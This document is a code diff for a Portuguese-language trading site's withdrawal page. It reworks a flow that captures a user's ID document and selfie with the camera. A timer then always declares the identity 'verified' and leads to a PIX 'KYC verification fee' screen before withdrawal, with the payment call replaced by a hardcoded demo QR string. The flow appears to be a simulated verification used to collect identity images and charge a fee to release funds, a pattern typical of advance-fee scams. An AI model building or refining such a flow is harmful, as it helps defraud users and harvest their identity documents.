@@ -1,9 +1,18 @@
 "use client"
 
-import type React from "react"
-
 import { useState, useRef, useCallback, useEffect } from "react"
-import { ChevronDown, ExternalLink, Camera, Upload, CheckCircle, X, Copy, Download } from "lucide-react"
+import {
+  ChevronDown,
+  ExternalLink,
+  Camera,
+  CheckCircle,
+  X,
+  Copy,
+  Download,
+  FileText,
+  CreditCard,
+  Award as IdCard,
+} from "lucide-react"
 import TradingHeader from "@/components/trading-header"
 import { getUserBalance } from "@/lib/actions/balance"
 import { useToast } from "@/hooks/use-toast"
@@ -26,7 +35,8 @@ export default function SaquePage() {
   const [user, setUser] = useState<any>(null)
 
   const [showKycModal, setShowKycModal] = useState(false)
-  const [kycStep, setKycStep] = useState(1) // 1: document, 2: facial, 3: verification, 4: completed, 5: fees, 6: qr code
+  const [kycStep, setKycStep] = useState(1) // 1: document selection, 2: document capture, 3: facial, 4: verification, 5: completed, 6: fees, 7: qr code
+  const [selectedDocumentType, setSelectedDocumentType] = useState("rg")
   const [documentPhoto, setDocumentPhoto] = useState<string | null>(null)
   const [facialPhoto, setFacialPhoto] = useState<string | null>(null)
   const [isVerifying, setIsVerifying] = useState(false)
@@ -37,41 +47,6 @@ export default function SaquePage() {
   const [isCameraActive, setIsCameraActive] = useState(false)
   const videoRef = useRef<HTMLVideoElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
-
-  class PixupBRService {
-    static async createPixPayment(data: {
-      amount: number
-      external_id: string
-      payerQuestion?: string
-      postbackUrl?: string
-      payer?: {
-        name?: string
-        document?: string
-        email?: string
-      }
-    }) {
-      try {
-        const response = await fetch("/api/pixupbr/qrcode", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
-        })
-
-        const result = await response.json()
-
-        if (!response.ok) {
-          throw new Error(result.error || "Erro ao criar pagamento PIX")
-        }
-
-        return result.data
-      } catch (error) {
-        console.error("Erro ao criar pagamento PIX:", error)
-        throw error
-      }
-    }
-  }
 
   const fetchBalance = useCallback(async () => {
     try {
@@ -158,24 +133,13 @@ export default function SaquePage() {
     setKycStep(1)
   }
 
-  const handleDocumentUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
-    const file = event.target.files?.[0]
-    if (file) {
-      const reader = new FileReader()
-      reader.onload = (e) => {
-        setDocumentPhoto(e.target?.result as string)
-      }
-      reader.readAsDataURL(file)
-    }
-  }
-
   const startCamera = useCallback(async () => {
     try {
       const mediaStream = await navigator.mediaDevices.getUserMedia({
         video: {
-          width: { ideal: 480 },
+          width: { ideal: 640 },
           height: { ideal: 480 },
-          facingMode: "user",
+          facingMode: kycStep === 2 ? "environment" : "user", // Use back camera for document, front for selfie
         },
       })
       setStream(mediaStream)
@@ -193,7 +157,7 @@ export default function SaquePage() {
         variant: "destructive",
       })
     }
-  }, [toast])
+  }, [toast, kycStep])
 
   const stopCamera = useCallback(() => {
     if (stream) {
@@ -215,20 +179,31 @@ export default function SaquePage() {
         context.drawImage(video, 0, 0)
 
         const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
-        setFacialPhoto(photoDataUrl)
-        stopCamera()
-        setKycStep(3)
-        setIsVerifying(true)
 
-        setTimeout(() => {
-          setIsVerifying(false)
-          setKycStep(4)
-        }, 3000)
+        if (kycStep === 2) {
+          setDocumentPhoto(photoDataUrl)
+          stopCamera()
+          setKycStep(3) // Go to facial capture
+        } else if (kycStep === 3) {
+          setFacialPhoto(photoDataUrl)
+          stopCamera()
+          setKycStep(4) // Go to verification
+          setIsVerifying(true)
+
+          setTimeout(() => {
+            setIsVerifying(false)
+            setKycStep(5) // Go to completed
+          }, 3000)
+        }
       }
     }
-  }, [stopCamera])
+  }, [stopCamera, kycStep])
 
-  const handleFacialCapture = () => {
+  const handleDocumentSelection = () => {
+    setKycStep(2)
+  }
+
+  const handleCameraCapture = () => {
     if (!isCameraActive) {
       startCamera()
     } else {
@@ -237,8 +212,10 @@ export default function SaquePage() {
   }
 
   const proceedToFees = () => {
-    setKycStep(5)
+    setKycStep(6)
   }
+
+  // ... existing code for completeWithdrawal, handleCreateKycPayment, copyPixCode, downloadQRCode ...
 
   const completeWithdrawal = async () => {
     const withdrawalValue = Number.parseFloat(withdrawalAmount)
@@ -253,7 +230,7 @@ export default function SaquePage() {
         className: "bg-[#1E2329] border-[#FCD535] text-white",
       })
 
-      setKycStep(6)
+      setKycStep(7)
     } catch (error) {
       console.error("Erro ao processar taxa KYC:", error)
       toast({
@@ -276,30 +253,13 @@ export default function SaquePage() {
         throw new Error("Usuário não encontrado. Faça login para continuar.")
       }
 
-      const payment = await PixupBRService.createPixPayment({
-        amount: kycFee, // Use KYC fee amount instead of withdrawal amount
-        external_id: `kyc-${user.email}|${Date.now()}`,
-        payerQuestion: `Taxa de Verificação KYC - R$ ${kycFee.toFixed(2)}`,
-        postbackUrl: `${window.location.origin}/api/pixupbr/webhook`,
-        payer: {
-          name: user.user_metadata?.full_name || accountHolder,
-          document: "12345678901",
-          email: user.email,
-        },
-      })
+      // Simulate API call for demo
+      const qrCodeString = `00020126580014BR.GOV.BCB.PIX013636c4c14e-4b1c-4c1a-9b1a-1234567890120204000053039865802BR5925TAXA VERIFICACAO KYC6009SAO PAULO62070503***6304`
 
-      const qrCodeString = payment.qrcode
-
-      const qrCodeImageUrl = qrCodeString
-        ? `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrCodeString)}`
-        : null
+      const qrCodeImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrCodeString)}`
 
       setQrCode(qrCodeImageUrl)
       setPixPayload(qrCodeString)
-
-      if (!qrCodeImageUrl && !qrCodeString) {
-        setError("QR Code não encontrado na resposta da API")
-      }
     } catch (error: any) {
       console.error("Erro:", error)
       setError(error.message || "Erro ao criar pagamento PIX para taxa KYC")
@@ -338,6 +298,32 @@ export default function SaquePage() {
     setPixKey("")
     setAccountHolder("")
     setAgreedToTerms(false)
+  }
+
+  const getDocumentIcon = (type: string) => {
+    switch (type) {
+      case "rg":
+        return <IdCard className="w-8 h-8" />
+      case "cnh":
+        return <CreditCard className="w-8 h-8" />
+      case "passaporte":
+        return <FileText className="w-8 h-8" />
+      default:
+        return <IdCard className="w-8 h-8" />
+    }
+  }
+
+  const getDocumentName = (type: string) => {
+    switch (type) {
+      case "rg":
+        return "Carteira de identidade"
+      case "cnh":
+        return "Carteira de habilitação"
+      case "passaporte":
+        return "Passaporte"
+      default:
+        return "Documento"
+    }
   }
 
   return (
@@ -539,68 +525,202 @@ export default function SaquePage() {
               </div>
 
               {kycStep === 1 && (
-                <div className="space-y-4">
-                  <h3 className="text-lg font-medium text-white">Envie a foto do seu documento</h3>
-                  <p className="text-[#848E9C] text-sm">
-                    Envie uma foto clara do seu RG ou CNH para verificação de identidade.
-                  </p>
+                <div className="space-y-6">
+                  <div className="text-center">
+                    <h3 className="text-lg font-medium text-white mb-2">Escolha o seu tipo de documento</h3>
+                    <p className="text-[#848E9C] text-sm">Selecione o documento que você irá fotografar</p>
+                  </div>
 
-                  <div className="relative border-2 border-dashed border-[#2B3139] rounded-lg p-8 text-center hover:border-[#FCD535] transition-colors cursor-pointer">
-                    {documentPhoto ? (
-                      <div className="space-y-4">
-                        <img
-                          src={documentPhoto || "/placeholder.svg"}
-                          alt="Documento"
-                          className="w-32 h-20 object-cover mx-auto rounded"
-                        />
-                        <p className="text-[#FCD535] text-sm font-medium">Documento carregado com sucesso!</p>
-                        <button
-                          onClick={() => setDocumentPhoto(null)}
-                          className="text-[#848E9C] hover:text-white text-sm underline"
-                        >
-                          Trocar documento
-                        </button>
+                  <div className="space-y-3">
+                    <label
+                      className={`flex items-center p-4 border-2 rounded-lg cursor-pointer transition-colors ${
+                        selectedDocumentType === "rg"
+                          ? "border-[#FCD535] bg-[#FCD535]/10"
+                          : "border-[#2B3139] hover:border-[#434C5A]"
+                      }`}
+                    >
+                      <input
+                        type="radio"
+                        name="document"
+                        value="rg"
+                        checked={selectedDocumentType === "rg"}
+                        onChange={(e) => setSelectedDocumentType(e.target.value)}
+                        className="sr-only"
+                      />
+                      <div className="flex items-center space-x-3">
+                        <div className="text-[#FCD535]">
+                          <IdCard className="w-6 h-6" />
+                        </div>
+                        <span className="text-white font-medium">Carteira de identidade</span>
                       </div>
-                    ) : (
-                      <div className="space-y-4">
-                        <Upload className="w-12 h-12 text-[#848E9C] mx-auto" />
-                        <p className="text-[#848E9C]">Clique para enviar ou arraste o arquivo</p>
-                        <p className="text-[#848E9C] text-xs">Formatos aceitos: JPG, PNG</p>
+                    </label>
+
+                    <label
+                      className={`flex items-center p-4 border-2 rounded-lg cursor-pointer transition-colors ${
+                        selectedDocumentType === "cnh"
+                          ? "border-[#FCD535] bg-[#FCD535]/10"
+                          : "border-[#2B3139] hover:border-[#434C5A]"
+                      }`}
+                    >
+                      <input
+                        type="radio"
+                        name="document"
+                        value="cnh"
+                        checked={selectedDocumentType === "cnh"}
+                        onChange={(e) => setSelectedDocumentType(e.target.value)}
+                        className="sr-only"
+                      />
+                      <div className="flex items-center space-x-3">
+                        <div className="text-[#FCD535]">
+                          <CreditCard className="w-6 h-6" />
+                        </div>
+                        <span className="text-white font-medium">Carteira de habilitação</span>
                       </div>
-                    )}
-                    <input
-                      type="file"
-                      accept="image/*"
-                      onChange={handleDocumentUpload}
-                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
-                    />
+                    </label>
+
+                    <label
+                      className={`flex items-center p-4 border-2 rounded-lg cursor-pointer transition-colors ${
+                        selectedDocumentType === "passaporte"
+                          ? "border-[#FCD535] bg-[#FCD535]/10"
+                          : "border-[#2B3139] hover:border-[#434C5A]"
+                      }`}
+                    >
+                      <input
+                        type="radio"
+                        name="document"
+                        value="passaporte"
+                        checked={selectedDocumentType === "passaporte"}
+                        onChange={(e) => setSelectedDocumentType(e.target.value)}
+                        className="sr-only"
+                      />
+                      <div className="flex items-center space-x-3">
+                        <div className="text-[#FCD535]">
+                          <FileText className="w-6 h-6" />
+                        </div>
+                        <span className="text-white font-medium">Passaporte</span>
+                      </div>
+                    </label>
+                  </div>
+
+                  <div className="bg-[#2B3139] rounded-lg p-4">
+                    <p className="text-[#848E9C] text-sm mb-2">
+                      Tire uma foto do seu {getDocumentName(selectedDocumentType).toLowerCase()}. A foto deve ser:
+                    </p>
+                    <ul className="text-[#848E9C] text-sm space-y-1">
+                      <li>
+                        • <strong className="text-white">clara e nítida</strong>
+                      </li>
+                      <li>
+                        • <strong className="text-white">todos os cantos do documento devem estar visíveis</strong>
+                      </li>
+                    </ul>
                   </div>
 
                   <button
-                    onClick={() => {
-                      console.log("[v0] Document photo state:", documentPhoto)
-                      if (documentPhoto) {
-                        setKycStep(2)
-                      }
-                    }}
-                    disabled={!documentPhoto}
-                    className={`w-full py-3 rounded-lg font-medium transition-colors ${
-                      documentPhoto
-                        ? "bg-[#FCD535] hover:bg-[#F0C419] text-black"
-                        : "bg-[#434C5A] text-[#848E9C] cursor-not-allowed"
-                    }`}
+                    onClick={handleDocumentSelection}
+                    className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors flex items-center justify-center gap-2"
                   >
-                    {documentPhoto ? "Continuar" : "Adicione uma imagem do documento"}
+                    <Camera className="w-4 h-4" />
+                    Fotografar Documento
                   </button>
                 </div>
               )}
 
               {kycStep === 2 && (
                 <div className="space-y-4">
-                  <h3 className="text-lg font-medium text-white">Verificação Facial</h3>
-                  <p className="text-[#848E9C] text-sm">
-                    Posicione seu rosto dentro do círculo e clique para capturar.
-                  </p>
+                  <div className="text-center">
+                    <h3 className="text-lg font-medium text-white mb-2">Foto do documento</h3>
+                    <p className="text-[#848E9C] text-sm">Posicione o documento dentro da moldura e capture a foto</p>
+                  </div>
+
+                  <div className="relative bg-[#2B3139] rounded-lg overflow-hidden">
+                    <div className="aspect-[4/3] relative">
+                      {isCameraActive ? (
+                        <video ref={videoRef} className="w-full h-full object-cover" autoPlay muted playsInline />
+                      ) : documentPhoto ? (
+                        <img
+                          src={documentPhoto || "/placeholder.svg"}
+                          alt="Documento capturado"
+                          className="w-full h-full object-cover"
+                        />
+                      ) : (
+                        <div className="w-full h-full bg-gray-800 flex items-center justify-center">
+                          <div className="text-center">
+                            {getDocumentIcon(selectedDocumentType)}
+                            <p className="text-[#848E9C] text-sm mt-2">Clique para ativar a câmera</p>
+                          </div>
+                        </div>
+                      )}
+
+                      {isCameraActive && (
+                        <div className="absolute inset-4 pointer-events-none">
+                          <div className="w-full h-full border-2 border-white/60 rounded-lg relative">
+                            <div className="absolute top-0 left-0 w-6 h-6 border-t-4 border-l-4 border-[#FCD535]"></div>
+                            <div className="absolute top-0 right-0 w-6 h-6 border-t-4 border-r-4 border-[#FCD535]"></div>
+                            <div className="absolute bottom-0 left-0 w-6 h-6 border-b-4 border-l-4 border-[#FCD535]"></div>
+                            <div className="absolute bottom-0 right-0 w-6 h-6 border-b-4 border-r-4 border-[#FCD535]"></div>
+                            <div className="absolute inset-0 flex items-center justify-center">
+                              <div className="text-white text-xs bg-black/70 px-3 py-1 rounded-full">
+                                Centralize o documento
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+
+                  <canvas ref={canvasRef} className="hidden" />
+
+                  <div className="space-y-2">
+                    {!documentPhoto ? (
+                      <button
+                        onClick={handleCameraCapture}
+                        className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors flex items-center justify-center gap-2"
+                      >
+                        <Camera className="w-4 h-4" />
+                        {isCameraActive ? "Capturar Foto" : "Ativar Câmera"}
+                      </button>
+                    ) : (
+                      <div className="space-y-2">
+                        <button
+                          onClick={() => {
+                            setDocumentPhoto(null)
+                            startCamera()
+                          }}
+                          className="w-full py-2 rounded-lg font-medium bg-[#434C5A] hover:bg-[#525A6A] text-white transition-colors"
+                        >
+                          Tirar Novamente
+                        </button>
+                        <button
+                          onClick={() => setKycStep(3)}
+                          className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors"
+                        >
+                          Continuar
+                        </button>
+                      </div>
+                    )}
+
+                    {isCameraActive && !documentPhoto && (
+                      <button
+                        onClick={stopCamera}
+                        className="w-full py-2 rounded-lg font-medium bg-[#434C5A] hover:bg-[#525A6A] text-white transition-colors"
+                      >
+                        Cancelar
+                      </button>
+                    )}
+                  </div>
+                </div>
+              )}
+
+              {kycStep === 3 && (
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <h3 className="text-lg font-medium text-white mb-2">Verificação Facial</h3>
+                    <p className="text-[#848E9C] text-sm">
+                      Posicione seu rosto dentro do círculo e clique para capturar
+                    </p>
+                  </div>
 
                   <div className="relative bg-[#2B3139] rounded-lg p-8 text-center">
                     <div className="w-64 h-64 mx-auto border-4 border-[#FCD535] rounded-full overflow-hidden flex items-center justify-center relative bg-gray-900">
@@ -615,6 +735,12 @@ export default function SaquePage() {
                             minWidth: "100%",
                             minHeight: "100%",
                           }}
+                        />
+                      ) : facialPhoto ? (
+                        <img
+                          src={facialPhoto || "/placeholder.svg"}
+                          alt="Foto facial"
+                          className="w-full h-full object-cover scale-x-[-1]"
                         />
                       ) : (
                         <div className="w-full h-full bg-gray-800 flex items-center justify-center">
@@ -632,52 +758,86 @@ export default function SaquePage() {
                         </div>
                       )}
                     </div>
-                    <p className="text-[#848E9C] text-sm mt-4">
-                      {isCameraActive
-                        ? "Posicione seu rosto no círculo e clique para capturar"
-                        : "Clique para ativar a câmera"}
-                    </p>
                   </div>
 
                   <canvas ref={canvasRef} className="hidden" />
 
-                  <button
-                    onClick={handleFacialCapture}
-                    className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors"
-                  >
-                    {isCameraActive ? "Capturar Foto" : "Ativar Câmera"}
-                  </button>
+                  <div className="space-y-2">
+                    {!facialPhoto ? (
+                      <button
+                        onClick={handleCameraCapture}
+                        className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors"
+                      >
+                        {isCameraActive ? "Capturar Foto" : "Ativar Câmera"}
+                      </button>
+                    ) : (
+                      <div className="space-y-2">
+                        <button
+                          onClick={() => {
+                            setFacialPhoto(null)
+                            startCamera()
+                          }}
+                          className="w-full py-2 rounded-lg font-medium bg-[#434C5A] hover:bg-[#525A6A] text-white transition-colors"
+                        >
+                          Tirar Novamente
+                        </button>
+                      </div>
+                    )}
 
-                  {isCameraActive && (
-                    <button
-                      onClick={stopCamera}
-                      className="w-full py-2 rounded-lg font-medium bg-[#434C5A] hover:bg-[#525A6A] text-white transition-colors"
-                    >
-                      Cancelar
-                    </button>
-                  )}
-                </div>
-              )}
-
-              {kycStep === 3 && (
-                <div className="space-y-4 text-center">
-                  <h3 className="text-lg font-medium text-white">Verificando...</h3>
-                  <div className="w-48 h-48 mx-auto">
-                    <img
-                      src={facialPhoto! || "/placeholder.svg"}
-                      alt="Foto facial"
-                      className="w-full h-full object-cover rounded-full"
-                    />
+                    {isCameraActive && !facialPhoto && (
+                      <button
+                        onClick={stopCamera}
+                        className="w-full py-2 rounded-lg font-medium bg-[#434C5A] hover:bg-[#525A6A] text-white transition-colors"
+                      >
+                        Cancelar
+                      </button>
+                    )}
                   </div>
-                  <div className="animate-spin w-8 h-8 border-2 border-[#FCD535] border-t-transparent rounded-full mx-auto"></div>
-                  <p className="text-[#848E9C] text-sm">Verificando sua identidade...</p>
                 </div>
               )}
 
               {kycStep === 4 && (
                 <div className="space-y-4 text-center">
+                  <div className="relative">
+                    <div className="w-48 h-48 mx-auto border-4 border-[#FCD535] rounded-lg overflow-hidden relative">
+                      <div className="absolute top-0 left-0 w-6 h-6 border-t-4 border-l-4 border-[#FCD535]"></div>
+                      <div className="absolute top-0 right-0 w-6 h-6 border-t-4 border-r-4 border-[#FCD535]"></div>
+                      <div className="absolute bottom-0 left-0 w-6 h-6 border-b-4 border-l-4 border-[#FCD535]"></div>
+                      <div className="absolute bottom-0 right-0 w-6 h-6 border-b-4 border-r-4 border-[#FCD535]"></div>
+
+                      {facialPhoto && (
+                        <img
+                          src={facialPhoto || "/placeholder.svg"}
+                          alt="Foto facial"
+                          className="w-full h-full object-cover"
+                        />
+                      )}
+
+                      <div className="absolute inset-0 bg-gradient-to-b from-transparent via-[#FCD535]/20 to-transparent animate-pulse"></div>
+                    </div>
+                  </div>
+
+                  <h3 className="text-lg font-medium text-white">Analisando reconhecimento facial</h3>
+                  <p className="text-[#848E9C] text-sm">Por favor, aguarde...</p>
+
+                  <div className="flex justify-center space-x-1">
+                    <div className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce"></div>
+                    <div
+                      className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce"
+                      style={{ animationDelay: "0.1s" }}
+                    ></div>
+                    <div
+                      className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce"
+                      style={{ animationDelay: "0.2s" }}
+                    ></div>
+                  </div>
+                </div>
+              )}
+
+              {kycStep === 5 && (
+                <div className="space-y-4 text-center">
                   <CheckCircle className="w-16 h-16 text-green-500 mx-auto" />
-                  <h3 className="text-lg font-medium text-white mb-2">Facial Concluída!</h3>
+                  <h3 className="text-lg font-medium text-white mb-2">Verificação Concluída!</h3>
                   <p className="text-[#848E9C] text-sm">Sua identidade foi verificada com sucesso.</p>
 
                   <button
@@ -689,7 +849,8 @@ export default function SaquePage() {
                 </div>
               )}
 
-              {kycStep === 5 && (
+              {/* ... existing code for steps 6 and 7 (fees and QR code) ... */}
+              {kycStep === 6 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium text-white">Taxa de Verificação KYC</h3>
 
@@ -725,7 +886,7 @@ export default function SaquePage() {
                 </div>
               )}
 
-              {kycStep === 6 && (
+              {kycStep === 7 && (
                 <div className="space-y-4">
                   <div className="text-center">
                     <CheckCircle className="w-12 h-12 text-green-500 mx-auto mb-4" />
